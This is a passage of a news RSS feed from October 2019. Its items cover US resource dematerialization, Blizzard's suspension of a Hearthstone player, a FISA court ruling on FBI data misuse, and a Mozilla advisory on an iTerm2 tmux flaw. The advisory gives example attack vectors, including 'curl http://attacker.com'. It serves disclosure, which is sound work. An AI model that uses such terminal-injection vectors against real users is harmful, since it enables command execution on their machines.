&lt;p&gt;&lt;img class=&quot;wp-image-8026820 size-large&quot; src=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/ag-1024x744.png&quot; alt=&quot;U.S. Crop Tonnage and Consumption of Agricultural Inputs, 1955–2015&quot; width=&quot;1024&quot; height=&quot;744&quot; data-credit=&quot;U.S. Crop Tonnage and Consumption of Agricultural Inputs, 1955–2015&quot; srcset=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/ag-1024x744.png 1024w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/ag-300x218.png 300w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/ag-768x558.png 768w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/ag.png 1422w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/p&gt;
U.S. Crop Tonnage and Consumption of Agricultural Inputs, 1955–2015
&lt;p&gt;&lt;span&gt;Here again, output (crop tonnage) used to be tightly linked to inputs (water and fertilizer). But then that relationship changed, and we're now getting more from less. Fertilizer use is down almost 25 percent from its 1999 peak, and by 2014 total water used for irrigation had decreased by more than 22 percent from its maximum in 1984. Total cropland has also fallen, to levels rivaling the lowest points of the previous century.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Building structures and infrastructure requires a lot of resources, so let's look at total consumption, according to the USGS, of the most important building materials. Let's also include data on timber use from the U.S. Department of Agriculture and throw in paper for good measure.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img class=&quot;wp-image-8026821 size-large&quot; src=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/build-1024x744.png&quot; alt=&quot;U.S. GDP and Consumption of Building and Wood Products, 1900–2015&quot; width=&quot;1024&quot; height=&quot;744&quot; data-credit=&quot;U.S. GDP and Consumption of Building and Wood Products, 1900–2015&quot; srcset=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/build-1024x744.png 1024w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/build-300x218.png 300w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/build-768x558.png 768w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/build.png 1422w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/p&gt;
U.S. GDP and Consumption of Building and Wood Products, 1900–2015
&lt;p&gt;&lt;span&gt;Here I see two different stories. The first is about building materials—cement, sand and gravel, and stone. Consumption of all of these peaked in 2007 and has dropped sharply since. But the sharp drop-off is surely because of the Great Recession, which hit the construction industries particularly hard. As construction recovers, we may find that we are not post-peak in these materials. But I predict that we're forever post-peak in our use of both wood and paper. Total timber use is down by a third and paper by almost 20 percent since their high points.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Are these graphs representative of what's been going on in the American economy as a whole? They are. Of the 72 resources tracked by the USGS, from aluminum and antimony through vermiculite and zinc, only six are not yet post-peak. Of these, we spend by far the most on gemstones. We Americans apparently have a bottomless thirst for bling. If shiny ornamental stones are excluded from the analysis, then more than 90 percent of total 2015 resource spending in America was on post-peak materials.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;American consumption of plastics, which is not tracked by the USGS, is an exception to the overall trend of dematerialization. Outside of recessions, the United States continues to use more plastic year after year in the form of trash bags, water bottles, food packaging, toys, outdoor furniture, and countless other products. But in recent years, there has been an important slowdown.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;According to the Plastics Industry Trade Association, between 1970 and the start of the Great Recession in 2007, American plastic use grew at a rate of about 5.2 percent per year. This was more than 60 percent faster than the country's GDP grew over the same period. But a very different pattern has emerged in the years since the recession ended. The growth in plastic consumption has slowed down greatly, to less than 2 percent per year between 2009 and 2015. This is almost 14 percent slower than GDP growth over the same period. So while America is not yet post-peak in its use of plastic, it's quickly closing in on this milestone.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Finally, let's look at total energy consumption combined with greenhouse gas emissions, which are the most harmful side effect of generating energy from fossil fuels.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img class=&quot;wp-image-8026819 size-large&quot; src=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/energy-1024x744.png&quot; alt=&quot;U.S. Real GDP and Total Energy Consumption, 1800–2017&quot; width=&quot;1024&quot; height=&quot;744&quot; data-credit=&quot;U.S. Real GDP and Total Energy Consumption, 1800–2017&quot; srcset=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/energy-1024x744.png 1024w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/energy-300x218.png 300w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/energy-768x558.png 768w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/energy.png 1422w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/p&gt;
U.S. Real GDP and Total Energy Consumption, 1800–2017
&lt;p&gt;&lt;span&gt;I was surprised to learn that total American energy use in 2017 was down almost 2 percent from its 2008 peak, especially since our economy grew by more than 15 percent between those two years. I had walked around with the unexamined assumption that growing economies must consume more energy year after year. This turns out not to be the case anymore—a profound change. Energy use went up in lockstep with economic growth in America for more than a century and a half, from 1800 to 1970. Then the increase in energy use slowed down, and then it turned negative—even as the economy kept growing. Over the last decade, we've gotten more economic output from less energy. &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Greenhouse gas emissions have gone down even more quickly than has total energy use. This is largely because we have in recent years been using less coal to generate electricity and more natural gas, which produces 50–60 percent less carbon per kilowatt-hour.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The conclusion from this set of graphs is clear: A great reversal of our Industrial Age habits is taking place. The American economy is now experiencing broad and often deep absolute dematerialization. &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Is the rest of the world dematerializing? It's a hard question to answer definitively because there's no equivalent of the detailed and comprehensive USGS data for countries other than America. There is evidence, though, that other advanced industrialized nations are also now getting more from less. Goodall, of course, found that the United Kingdom is now past &quot;peak stuff.&quot; And Eurostat data show that countries including Germany, France, and Italy have generally seen flat or declining total consumption of metals, chemicals, and fertilizer in recent years.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Developing countries, especially fast-growing ones such as India and China, are probably not yet dematerializing. But I predict that they will start getting more from less of at least some resources in the not-too-distant future.&lt;/span&gt;&lt;a href=&quot;https://www.amazon.com/exec/obidos/ASIN/1982103574/reasonfoundation-20/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;
&lt;p&gt;&lt;img class=&quot;wp-image-8026833 size-medium aligncenter&quot; src=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/More-From-Less-199x300.jpg&quot; alt=&quot;&quot; width=&quot;199&quot; height=&quot;300&quot; data-credit=&quot;Amazon.com&quot; srcset=&quot;https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/More-From-Less-199x300.jpg 199w, https://d2eehagpk5cl65.cloudfront.net/img/q60/uploads/2019/10/More-From-Less.jpg 500w&quot; sizes=&quot;(max-width: 199px) 100vw, 199px&quot;/&gt;&lt;/p&gt;
&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 16:27:45 +0000</pubDate>
<dc:creator>utternerd</dc:creator>
<og:type>article</og:type>
<og:url>https://reason.com/2019/10/09/the-economy-keeps-growing-but-americans-are-using-less-steel-paper-fertilizer-and-energy/</og:url>
<og:title>The Economy Keeps Growing, but Americans Are Using Less Steel, Paper, Fertilizer, and Energy</og:title>
<og:description>Environmental scientist Jesse Ausubel remembers the moment his research trajectory changed. Over dinner one night in 1987, his friend and</og:description>
<og:image>https://reason.com/wp-content/uploads/2019/10/Steel-Plant-1161x630.jpg</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://reason.com/2019/10/09/the-economy-keeps-growing-but-americans-are-using-less-steel-paper-fertilizer-and-energy/</dc:identifier>
</item>
<item>
<title>Fallout from Blizzard Hong Kong Incident</title>
<link>https://www.vice.com/en_us/article/bjw535/blizzards-hong-kong-screw-up-is-officially-an-international-incident</link>
<guid isPermaLink="true" >https://www.vice.com/en_us/article/bjw535/blizzards-hong-kong-screw-up-is-officially-an-international-incident</guid>
<description>&lt;p&gt;Outrage at Activision Blizzard is mounting after the company suspended &lt;em&gt;Hearthstone&lt;/em&gt; pro Chung “Blitzchung” Ng Wai for &lt;a href=&quot;https://www.vice.com/en_us/article/j5yba8/activision-blizzard-suspends-hearthstone-pro-player-blitzchung-for-supporting-hong-kong-protests&quot; target=&quot;_blank&quot;&gt;declaring his support of Hong Kong’s protest movement&lt;/a&gt;. Fans are mad, U.S. politicians are angry, and there’s evidence that even Blizzard’s employees are upset.&lt;/p&gt;
&lt;p&gt;United States Senators Marco Rubio (R-Florida) and Ron Wyden (D-Oregon) both tweeted their condemnation of Activision Blizzard’s actions on Tuesday. “Blizzard shows it is willing to humiliate itself to please the Chinese Communist Party,” &lt;a href=&quot;https://twitter.com/RonWyden/status/1181637167749193729&quot; target=&quot;_blank&quot;&gt;Senator Wyden tweeted&lt;/a&gt;. “No American company should censor calls for freedom to make a quick buck.”&lt;/p&gt;

&lt;p&gt;“Recognize what’s happening here,” &lt;a href=&quot;https://twitter.com/marcorubio/status/1181556058659135488&quot; target=&quot;_blank&quot;&gt;Senator Rubio said on Twitter&lt;/a&gt;. “People who don’t live in #China must either self censor or face dismissal &amp;amp; suspensions. China using access to market as leverage to crush free speech globally. Implications of this will be felt long after everyone in U.S. politics today is gone.”&lt;/p&gt;

&lt;p&gt;“Blizzard’s decision to censor a player who voiced support for the Hong Kong protests is part of a profoundly disturbing trend by American entities like the &lt;a href=&quot;https://www.vice.com/en_us/article/qvgek5/one-tweet-from-the-rockets-gm-proved-just-how-desperate-the-nba-is-for-chinas-money&quot; target=&quot;_blank&quot;&gt;NBA bending over backward to appease the Chinese government&lt;/a&gt;,” Senator Wyden told VICE in an email. “China’s repression of peaceful dissent is disgusting when it happens in China, but it is incredibly disturbing that American companies would willingly participate in the Chinese government’s propaganda campaign.&quot;&lt;/p&gt;
&lt;p&gt;At the entrance to Blizzard’s Irvine, California campus, there’s &lt;a href=&quot;https://news.blizzard.com/en-us/blizzard/21349313/the-orc-statue&quot; target=&quot;_blank&quot;&gt;a 12-foot tall statue of an orc&lt;/a&gt;. Various bronze plaques bearing inspirational inscriptions are set into the concrete around the statue. The plaques herald lofty ideals such as “Gameplay first,” “Think Globally,” and “Every Voice Matters.” Kevin Hovdestad, an esports announcer and former Activision Blizzard employee, shared a photo of “Think Globally” and “Every Voice Matters” being covered up &lt;a href=&quot;https://twitter.com/lackofrealism/status/1181639970332659712&quot; target=&quot;_blank&quot;&gt;on Twitter.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;“Not everyone at Blizzard agrees with what happened,” said Hovdestad.&lt;/p&gt;

&lt;p&gt;It’s possible that if Activision Blizzard hadn’t taken action against Blitzchung, China would have taken action against Activision Blizzard. Beijing &lt;a href=&quot;https://www.vice.com/en_us/article/ywaq3g/after-a-south-park-censorship-episode-china-deleted-the-entire-show-from-the-web&quot; target=&quot;_blank&quot;&gt;banned South Park after it mocked the country&lt;/a&gt;, and stopped streaming pre-season NBA games after the general manager of the Houston Rockets tweeted a message of support for Hong Kong protesters.&lt;/p&gt;
&lt;p&gt;Tencent, a Chinese video game developer, owns a 4.9 percent stake in the company. China is a huge and important market where Activision Blizzard makes millions. The &lt;em&gt;World of Warcraft&lt;/em&gt; film, for example, &lt;a href=&quot;https://www.boxofficemojo.com/movies/?page=intl&amp;amp;id=warcraft.htm&quot; target=&quot;_blank&quot;&gt;fizzled in America but grossed $225 million in China&lt;/a&gt;, nearly double its budget.&lt;/p&gt;
&lt;p&gt;“Blizzard results benefited from the continued success of our business in China and the extension of our partnership with [Chinese telecom company] NetEase.,” Coddy Johnson, Activision Blizzard’s Chief Operating Officer, &lt;a href=&quot;https://www.fool.com/earnings/call-transcripts/2019/02/12/activision-blizzard-inc-atvi-q4-2018-earnings-conf.aspx&quot; target=&quot;_blank&quot;&gt;said in a 2018 earning’s call&lt;/a&gt;. “Building on our 11-year joint venture, the expanded agreement runs until January 2023 and reflects the substantial value and opportunity for Blizzard's content in China.”&lt;/p&gt;
&lt;p&gt;Unsurprisingly, this issue has caused a sharp reaction in Blizzard’s various communities.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://www.reddit.com/r/hearthstone/&quot; target=&quot;_blank&quot;&gt;/r/hearthstone subreddit&lt;/a&gt; is &lt;a href=&quot;https://www.reddit.com/r/hearthstone/comments/deyvf8/player_since_2014_i_quit_today/&quot; target=&quot;_blank&quot;&gt;awash in angry players&lt;/a&gt; &lt;a href=&quot;https://www.reddit.com/r/hearthstone/comments/dey8bh/i_play_hs_everyday_i_climbed_to_legend_several/&quot; target=&quot;_blank&quot;&gt;promising to give up on Activision Blizzard&lt;/a&gt;, and both &lt;a href=&quot;https://www.reddit.com/r/Overwatch/comments/dew67r/blizzard_ruling_on_hk_interview_blitzchung/&quot; target=&quot;_blank&quot;&gt;/r/overwatch&lt;/a&gt; and &lt;a href=&quot;https://www.reddit.com/r/wow/comments/dezn1k/regarding_the_blitzchung_situation_and_rwow/&quot; target=&quot;_blank&quot;&gt;/r/wow&lt;/a&gt; have threads dedicated to Chung’s suspension. As of this writing, &lt;a href=&quot;https://www.reddit.com/r/blizzard&quot; target=&quot;_blank&quot;&gt;the /r/blizzard subreddit is viewable by invitation only&lt;/a&gt;. Reddit confirmed with VICE that /r/blizzard’s mod community was responsible for the change, but declined to comment further. Blizzard’s own community forums are full of angry fans. The top thread on its &lt;em&gt;Hearthstone&lt;/em&gt; board stands in solidarity with Blitzchung. It currently has 606 replies and 6.7k views.&lt;/p&gt;

&lt;p&gt;“I play [&lt;em&gt;Hearthstone&lt;/em&gt;] everyday,” &lt;a href=&quot;https://www.reddit.com/r/hearthstone/comments/dey8bh/i_play_hs_everyday_i_climbed_to_legend_several/&quot; target=&quot;_blank&quot;&gt;redditor Hinz97 said in a post&lt;/a&gt;. “I climbed to Legend several times. I spent more than $10k. As a [Hong Konger], I quit [ &lt;em&gt;Hearthstone&lt;/em&gt;] without consideration.”&lt;/p&gt;
&lt;p&gt;“Quitting [&lt;em&gt;Hearthstone&lt;/em&gt;] over this nonsense. This is about more than just Hong Kong,” &lt;a href=&quot;https://www.reddit.com/r/hearthstone/comments/dezcvv/quitting_hs_over_this_nonsense_this_is_about_more/&quot; target=&quot;_blank&quot;&gt;redditor u/bye_bitches said in a post on /r/hearthstone&lt;/a&gt;. “If you're still playing, then you're sending a message: ‘I'm ok with this, multinationals should help China get away with violations of human rights.’ Hong Kong people are involved this time, just hope the next time it won't be you.”&lt;/p&gt;
&lt;p&gt;“I’ve been playing since beta. Good riddance,” &lt;a href=&quot;https://www.reddit.com/r/hearthstone/comments/dezkp6/ive_been_playing_since_beta_good_riddance/&quot; target=&quot;_blank&quot;&gt;redditor UltimaterializerX said&lt;/a&gt;. “Blizzard CLEARLY only cares about the Chinese market. The censorship of art was bad enough. The censorship of human life is indefensible. Finding videos of what’s going on in Hong Kong is easy and I suggest everyone do so. It’s Tiananmen Square all over again.”&lt;/p&gt;
&lt;p&gt;Activision Blizzard is less than a month from Blizzcon, an annual convention it puts on to showcase new games and celebrate its fans. Some fans are talking about boycotting the convention, others are planning to stage a protest. “With Blizzcon coming up, would be cool if people flew some pro-[Hong Kong] flags at the opening ceremony,” redditor pastesonly &lt;a href=&quot;https://www.reddit.com/r/wow/comments/dezn1k/regarding_the_blitzchung_situation_and_rwow/f2zwlwz?utm_source=share&amp;amp;utm_medium=web2x&quot; target=&quot;_blank&quot;&gt;said in a thread about the controversy on /r/wow&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Some of most dedicated Activision Blizzard fans feel betrayed. “I've played Blizzard games since I was seven,” said redditor Poobs87, &lt;a href=&quot;https://www.reddit.com/r/hearthstone/comments/deyvf8/player_since_2014_i_quit_today/&quot; target=&quot;_blank&quot;&gt;who has one of the most upvoted comments on /r/hearthstone&lt;/a&gt;, in a direct message to me on Reddit today. “They've been a big part of my life growing up, I respected them and loved the experiences they gave to me and my generation growing up...the Hong Kong protestors are up against an awful evil, and Blizzard is obviously just one of many companies being forced to comply with China's censorship.”&lt;/p&gt;

&lt;p&gt;Activision Blizzard did not respond to request for comment.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Follow Matthew on&lt;/em&gt; &lt;a href=&quot;https://twitter.com/mjgault&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt; &lt;em&gt;.&lt;/em&gt; &lt;em&gt;If you’re a Blizzard employee who’d like to anonymous, drop an email:&lt;/em&gt; &lt;a href=&quot;mailto:mjgault@gmail.com&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;mjgault@gmail.com&lt;/em&gt;&lt;/a&gt; &lt;em&gt;. He’s also available privately on Signal.&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 15:34:05 +0000</pubDate>
<dc:creator>rahuldottech</dc:creator>
<og:type>article</og:type>
<og:title>Blizzard's Hong Kong Screw-Up Is Officially an International Incident</og:title>
<og:image>https://video-images.vice.com/articles/5d9cf9ee674742000991ca8e/lede/1570569445736-blizzard.png?crop=1xw:0.8208081570996979xh;center,center&amp;resize=1200:*</og:image>
<og:url>https://www.vice.com/en_us/article/bjw535/blizzards-hong-kong-screw-up-is-officially-an-international-incident</og:url>
<og:description>The company's communities are in chaos and US senators are taking notice, following the suspension of a pro 'Hearthstone' player who declared support for Hong Kong's protest movement.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.vice.com/en_us/article/bjw535/blizzards-hong-kong-screw-up-is-officially-an-international-incident</dc:identifier>
</item>
<item>
<title>FBI misused surveillance data, spied on its own, FISA ruling finds</title>
<link>https://arstechnica.com/tech-policy/2019/10/unsealed-fisa-ruling-slaps-fbi-for-misuse-of-surveillance-data/</link>
<guid isPermaLink="true" >https://arstechnica.com/tech-policy/2019/10/unsealed-fisa-ruling-slaps-fbi-for-misuse-of-surveillance-data/</guid>
<description>&lt;img src=&quot;https://cdn.arstechnica.net/wp-content/uploads/2019/10/GettyImages-1086332002-800x534.jpg&quot; alt=&quot;FBI agents ran queries across thousands of US individuals, including potential sources and anyone with access to FBI facilities, against raw metadata from FISA-authorized bulk collection databases.&quot;/&gt;&lt;div class=&quot;caption-text&quot;&gt;&lt;a href=&quot;https://cdn.arstechnica.net/wp-content/uploads/2019/10/GettyImages-1086332002.jpg&quot; class=&quot;enlarge-link&quot; data-height=&quot;683&quot; data-width=&quot;1024&quot;&gt;Enlarge&lt;/a&gt; &lt;span class=&quot;sep&quot;&gt;/&lt;/span&gt; FBI agents ran queries across thousands of US individuals, including potential sources and anyone with access to FBI facilities, against raw metadata from FISA-authorized bulk collection databases.&lt;/div&gt;&lt;div class=&quot;caption-credit&quot;&gt;Bloomberg via Getty Images&lt;/div&gt;
&lt;aside id=&quot;social-left&quot; class=&quot;social-left&quot; aria-label=&quot;Read the comments or share this article&quot;&gt;
&lt;h4 class=&quot;comment-count-before&quot;&gt;&lt;a title=&quot;81 posters participating&quot; class=&quot;comment-count icon-comment-bubble-down&quot; href=&quot;https://arstechnica.com/tech-policy/2019/10/unsealed-fisa-ruling-slaps-fbi-for-misuse-of-surveillance-data/?comments=1&quot;&gt;reader comments&lt;/a&gt;&lt;/h4&gt;
&lt;a title=&quot;81 posters participating&quot; class=&quot;comment-count icon-comment-bubble-down&quot; href=&quot;https://arstechnica.com/tech-policy/2019/10/unsealed-fisa-ruling-slaps-fbi-for-misuse-of-surveillance-data/?comments=1&quot;&gt;&lt;span class=&quot;comment-count-number&quot;&gt;117&lt;/span&gt; &lt;span class=&quot;visually-hidden&quot;&gt;with 81 posters participating&lt;/span&gt;&lt;/a&gt;
&lt;div class=&quot;share-links&quot;&gt;
&lt;h4&gt;Share this story&lt;/h4&gt;
&lt;/div&gt;
&lt;/aside&gt;&lt;p&gt;In an October 2018 ruling &lt;a href=&quot;https://icontherecord.tumblr.com/post/188217887058/release-of-documents-related-to-the-2018-fisa&quot;&gt;unsealed and posted&lt;/a&gt; on October 8, 2019 by the Office of the Director of Intelligence, the United States Foreign Intelligence Surveillance Court (FISC) found that the employees of the Federal Bureau of Investigation had inappropriately used data collected under Section 702 of the Foreign Intelligence Surveillance Act (FISA). The FBI was found to have misused surveillance data to look into American residents, including other FBI employees and their family members, making large-scale queries that did not distinguish between US persons and foreign intelligence targets.&lt;/p&gt;
&lt;p&gt;The revelation drew immediate outcry from privacy advocates and renewed calls for the termination of FISA and USA FREEDOM Act that authorized bulk intelligence collection. President Donald Trump signed a bill extending Section 702 collection authorizations for six years in 2018; the Office of the Director of National Intelligence announced earlier this year that the administration would seek the extension of authority for collection of call data granted under the USA FREEDOM Act.&lt;/p&gt;
&lt;p&gt;In a statement emailed to Ars Technica, ACLU Senior Legislative Counsel Neema Singh Guliani, said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The government should not be able to spy on our calls and emails without a warrant. Any surveillance legislation considered by Congress this year must include reforms that address the disturbing abuses detailed in these opinions. Congress and the courts now have even more reason to prohibit warrantless searches of our information, and to permanently close the door on any collection of information that is not to or from a surveillance target.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Let me Intel-Google that&lt;/h2&gt;
&lt;p&gt;The Foreign Intelligence Surveillance Court ruling found that the FBI's &quot;querying procedures&quot; for intelligence data did not properly record when the database of intelligence data was searched for information about US persons. &quot;The querying procedures did not require FBI personnel to document the basis for finding that each United States-person query term satisfied the relevant standard—i.e., that queries be reasonably designed to return foreign-inteligence information or evidence of crime,&quot; the FISC opinion stated. &quot;Without such documentation and in view of reported instances of non-compliance with that standard, the procedures seemed unreasonable under FISA's definition of 'minimization procedures' and possibly the Fourth Amendment.&quot;&lt;/p&gt;
&lt;p&gt;Among those instances of &quot;non-compliance&quot; were:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Between March 24 and 27, 2017, the FBI ran queries against intelligence data &quot;using identifiers for over 70,000 communications facilities 'associated with' persons with access to FBI facilities and systems,&quot; the court noted, &quot;notwithstanding advice from the FBI Office of General Counsel (OGC) that they should not be conducted without the approval of the OGC and the National Security Division of the Department of Justice.&quot;&lt;/li&gt;
&lt;li&gt;On December 1, 2017, a redacted FBI division &quot;conducted over 6,800 queries using the Social Security Numbers of individuals&quot; against raw, unredacted FISA data. A week later, the same unit conducted 1,600 queries using another set of identifiers for US persons. The person who conducted the queries &quot;advised he did not intend to run them against raw FISA information, but nonetheless reviewed raw FISA information returned by them.&quot;&lt;/li&gt;
&lt;li&gt;In February of 2018, the FBI searched raw FISA data for information, with about 30 queries regarding &quot;potential [redacted] sources,&quot; and conducted about 45 other queries on people &quot;under consideration as potential sources of information.&quot;&lt;/li&gt;
&lt;li&gt;In an undated event, reported to the Department of Justice's National Security Division in April of 2018, the FBI ran queries against raw FISA metadata using identifiers for &quot;approximately 57,000 individuals&quot; where it was not clear that the information would return foreign intelligence information.&lt;/li&gt;
&lt;li&gt;Queries against individual US persons were run against the FISA data on a number of occasions, including people about to be served a FISA order—and &quot;a small number of cases in which FBI personnel apparently conducted queries for improper personal reasons—for example, a contract linguist who ran queries on himself, other FBI employees, and relatives.&quot;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The court found a huge lack of oversight over the FBI's querying of FISA metadata and ordered the FBI to revise its search procedures. The FISC ruling said that the FISA statutory and Fourth Amendment concerns regarding warrantless searches would be cleared if all queries required written documentation of the basis for a belief by the FBI that searching against a US person's metadata would be &quot;reasonably likely to return foreign-intelligence information or evidence of crime&quot; before anyone at the FBI was allowed access to the contents of FISA data that would be returned by such a search.&lt;/p&gt;

</description>
<pubDate>Wed, 09 Oct 2019 14:28:16 +0000</pubDate>
<dc:creator>headalgorithm</dc:creator>
<og:url>https://arstechnica.com/tech-policy/2019/10/unsealed-fisa-ruling-slaps-fbi-for-misuse-of-surveillance-data/</og:url>
<og:title>FBI misused surveillance data, spied on its own, FISA ruling finds</og:title>
<og:image>https://cdn.arstechnica.net/wp-content/uploads/2019/10/GettyImages-1086332002-760x380.jpg</og:image>
<og:description>Contractor looked up relatives; data was used to vet agents, sources in US.</og:description>
<og:type>article</og:type>
<dc:language>en-us</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://arstechnica.com/tech-policy/2019/10/unsealed-fisa-ruling-slaps-fbi-for-misuse-of-surveillance-data/</dc:identifier>
</item>
<item>
<title>Critical Security Issue Identified in iTerm2</title>
<link>https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/</link>
<guid isPermaLink="true" >https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/</guid>
<description>&lt;p&gt;A security audit funded by the &lt;a href=&quot;https://mozilla.org/moss&quot;&gt;Mozilla Open Source Support Program&lt;/a&gt; (MOSS) has discovered a critical security vulnerability in the widely used macOS terminal emulator &lt;a href=&quot;https://iterm2.com/&quot;&gt;iTerm2&lt;/a&gt;. After finding the vulnerability, Mozilla, &lt;a href=&quot;https://radicallyopensecurity.com/&quot;&gt;Radically Open Security&lt;/a&gt; (ROS, the firm that conducted the audit), and iTerm2’s developer George Nachman worked closely together to develop and release a patch to ensure users were no longer subject to this security threat. All users of iTerm2 should update immediately to the latest version (3.3.6) which has been &lt;a href=&quot;https://groups.google.com/forum/m/#!topic/iterm2-discuss/57k_AuLdQa4&quot;&gt;published concurrent&lt;/a&gt; with this blog post.&lt;/p&gt;
&lt;p&gt;Founded in 2015, MOSS broadens access, increases security, and empowers users by providing catalytic support to open source technologists. Track III of MOSS — created in the wake of the 2014 &lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed vulnerability&lt;/a&gt; — supports security audits for widely used open source technologies like iTerm2. Mozilla is an open source company, and the funding MOSS provides is one of the key ways that we continue to ensure the open source ecosystem is healthy and secure.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://iterm2.com/&quot;&gt;iTerm2&lt;/a&gt; is one of the most popular terminal emulators in the world, and frequently used by developers. MOSS selected iTerm2 for a security audit because it processes untrusted data and it is widely used, including by high-risk targets (like developers and system administrators).&lt;/p&gt;
&lt;p&gt;During the audit, ROS identified a critical vulnerability in the tmux integration feature of iTerm2; this vulnerability has been present in iTerm2 for at least 7 years. An attacker who can produce output to the terminal can, in many cases, execute commands on the user’s computer. Example attack vectors for this would be connecting to an attacker-controlled SSH server or commands like &lt;em&gt;curl http://attacker.com&lt;/em&gt; and &lt;em&gt;tail -f /var/log/apache2/referer_log&lt;/em&gt;. We expect the community will find many more creative examples.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Proof-of-Concept video of a command being run on a mock victim’s machine after connecting to a malicious SSH server. In this case, only a calculator was opened as a placeholder for other, more nefarious commands.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Typically this vulnerability would require some degree of user interaction or trickery; but because it can be exploited via commands generally considered safe there is a high degree of concern about the potential impact.&lt;/p&gt;
&lt;p&gt;An update to iTerm2 is now available with a mitigation for this issue, which has been assigned CVE-2019-9535. While iTerm2 will eventually prompt you to update automatically, we recommend you proactively update by going to the iTerm2 menu and choosing &lt;strong&gt;Check for updates…&lt;/strong&gt; The fix is available in version 3.3.6. A prior update was published earlier this week (3.3.5),  it does not contain the fix.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ffp4g1ylyit3jdyti1hqcvtb-wpengine.netdna-ssl.com/security/files/2019/10/Screen-Shot-2019-10-08-at-2.18.36-PM.png&quot;&gt;&lt;img class=&quot;size-medium wp-image-2493 aligncenter&quot; src=&quot;https://ffp4g1ylyit3jdyti1hqcvtb-wpengine.netdna-ssl.com/security/files/2019/10/Screen-Shot-2019-10-08-at-2.18.36-PM-252x93.png&quot; alt=&quot;&quot; width=&quot;252&quot; height=&quot;93&quot; srcset=&quot;https://blog.mozilla.org/security/files/2019/10/Screen-Shot-2019-10-08-at-2.18.36-PM-252x93.png 252w, https://blog.mozilla.org/security/files/2019/10/Screen-Shot-2019-10-08-at-2.18.36-PM.png 343w&quot; sizes=&quot;(max-width: 252px) 100vw, 252px&quot;/&gt;&lt;/a&gt;If you’d like to apply for funding or an audit from MOSS, you can find application links &lt;a href=&quot;https://www.mozilla.org/en-US/moss/&quot;&gt;on the MOSS website&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Wed, 09 Oct 2019 14:26:25 +0000</pubDate>
<dc:creator>sciurus</dc:creator>
<og:title>Critical Security Issue identified in iTerm2 as part of Mozilla Open Source Audit</og:title>
<og:url>https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/</og:url>
<og:description>A security audit funded by the Mozilla Open Source Support Program (MOSS) has discovered a critical security vulnerability in the widely used macOS terminal emulator ...</og:description>
<og:image>https://blog.mozilla.org/security/files/2019/10/Screen-Shot-2019-10-08-at-2.18.36-PM-252x93.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/</dc:identifier>
</item>
<item>
<title>China attacks Apple for allowing Hong Kong crowdsourced police activity app</title>
